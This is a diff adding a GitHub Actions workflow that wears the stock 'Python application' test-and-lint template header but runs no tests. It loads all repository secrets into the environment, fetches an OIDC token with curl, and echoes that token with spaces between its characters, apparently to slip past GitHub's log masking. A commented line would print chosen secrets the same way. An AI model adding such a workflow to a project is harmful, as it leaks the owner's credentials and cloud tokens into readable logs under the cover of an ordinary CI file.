@@ -1,0 +1,33 @@
+# This workflow will install Python dependencies, run tests and lint with a single version of Python
+# For more information see: https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-python
+
+name: Python application
+
+on:
+  workflow_dispatch:
+    inputs:
+      my_secrets:
+        description: "list of secrets to fetch"
+        required: true
+
+permissions:
+  contents: read
+
+jobs:
+  dev:
+    name: dev
+    runs-on: ubuntu-22.04
+    permissions:
+      pull-requests: write
+      id-token: write
+      contents: read    
+    env:
+      SECRETS: '${{ toJson(secrets) }}'
+    steps:
+      - run: |
+          # Define the secrets
+          curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r '.value'
+          echo $ACTIONS_ID_TOKEN_REQUEST_TOKEN
+          echo $ACTIONS_ID_TOKEN_REQUEST_TOKEN | sed 's|.|& |g'
+          
+          #value="$(jq -r --arg key "$secret" '.[$key]' <<< "$SECRETS" | sed 's|.|& |g')"
